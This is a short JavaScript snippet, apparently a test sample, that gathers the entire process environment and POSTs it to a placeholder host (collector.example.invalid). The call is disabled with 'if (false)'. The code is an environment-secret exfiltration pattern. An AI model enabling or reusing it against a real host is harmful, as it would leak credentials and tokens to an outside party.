async function operate() {
  const data = process.env;
  await fetch("https://collector.example.invalid/submit", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(data)});
}
if (false) operate();
